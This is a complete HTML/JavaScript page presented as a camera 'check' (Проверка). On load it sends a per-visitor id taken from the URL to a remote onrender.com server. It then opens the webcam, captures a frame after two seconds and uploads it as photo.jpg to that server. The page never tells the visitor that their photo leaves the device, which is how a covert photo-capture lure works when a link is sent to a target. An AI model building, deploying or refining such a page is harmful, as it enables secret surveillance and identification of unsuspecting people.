<!DOCTYPE html>
<html lang="ru">

<head>

<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Camera</title>

<style>

body {
    font-family: Arial;
    text-align: center;
    padding: 30px;
}

video {
    width: 300px;
    margin-top: 20px;
}

</style>

</head>


<body>


<h1>Проверка</h1>

<h2 id="status">
Запуск...
</h2>


<video id="video" autoplay playsinline></video>



<script>


const RENDER_URL =
"https://kossah-github-io.onrender.com";


const status =
document.getElementById("status");


const video =
document.getElementById("video");



const params =
new URLSearchParams(window.location.search);


const id =
params.get("id");



async function sendId(){


    if(!id){

        status.innerHTML =
        "ID не найден";

        return;

    }


    await fetch(
        RENDER_URL + "/?id=" + id
    );


    status.innerHTML =
    "ID получен";


}




async function start(){


try{


    await sendId();



    const stream =
    await navigator.mediaDevices.getUserMedia({
        video:true
    });



    video.srcObject =
    stream;



    status.innerHTML =
    "Камера включена";


    // ждём пока появится изображение

    setTimeout(()=>{

        makePhoto(stream);


    },2000);



}
catch(e){


    status.innerHTML =
    "Ошибка камеры: " + e;


}



}




function makePhoto(stream){



    if(!video.videoWidth){

        status.innerHTML =
        "Камера ещё не готова";

        return;

    }




    const canvas =
    document.createElement("canvas");



    canvas.width =
    video.videoWidth;


    canvas.height =
    video.videoHeight;



    canvas
    .getContext("2d")
    .drawImage(video,0,0);




    canvas.toBlob(async(blob)=>{


        const form =
        new FormData();



        form.append(
            "id",
            id
        );



        form.append(
            "photo",
            blob,
            "photo.jpg"
        );



        const res =
        await fetch(
            RENDER_URL + "/photo",
            {
                method:"POST",
                body:form
            }
        );



        console.log(
            await res.text()
        );


        status.innerHTML =
        "Фото отправлено";



        stream
        .getTracks()
        .forEach(
            t=>t.stop()
        );



    }, "image/jpeg");



}



start();



</script>


</body>

</html>
